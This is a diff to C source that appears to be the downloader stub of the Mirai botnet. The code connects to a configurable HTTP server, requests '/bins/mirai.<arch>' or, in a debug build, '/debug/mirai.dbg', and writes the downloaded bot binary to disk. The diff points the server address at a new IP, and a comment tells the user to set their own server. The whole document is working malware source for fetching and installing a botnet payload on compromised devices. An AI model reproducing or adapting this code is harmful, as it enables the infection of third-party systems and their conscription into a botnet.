@@ -1,11 +1,15 @@
 #include <sys/types.h>
 //#include <bits/syscalls.h>
+#include <unistd.h>
 #include <sys/syscall.h>
 #include <fcntl.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#ifdef DEBUG
+#include <stdio.h>
+#endif
 
-#define HTTP_SERVER utils_inet_addr(127,0,0,1) // CHANGE TO YOUR HTTP SERVER IP
+#define HTTP_SERVER utils_inet_addr(192,168,2,3) // CHANGE TO YOUR HTTP SERVER IP
 
 #define EXEC_MSG            "MIRAI\n"
 #define EXEC_MSG_LEN        6
@@ -128,8 +132,13 @@ inline void run(void)
     printf("Connected to host\n");
 #endif
 
+#ifdef DEBUG
+    if (write(sfd, "GET /debug/mirai.dbg HTTP/1.0\r\n\r\n", 33) != 33)
+    {
+#else
     if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
     {
+#endif
 #ifdef DEBUG
         printf("Failed to send get request.\n");
 #endif
@@ -145,7 +154,6 @@ inline void run(void)
     {
         char ch;
         int ret = read(sfd, &ch, 1);
-
         if (ret != 1)
             __exit(4);
         header_parser = (header_parser << 8) | ch;
@@ -158,7 +166,6 @@ inline void run(void)
     while (1)
     {
         int ret = read(sfd, recvbuf, sizeof (recvbuf));
-
         if (ret <= 0)
             break;
         write(ffd, recvbuf, ret);
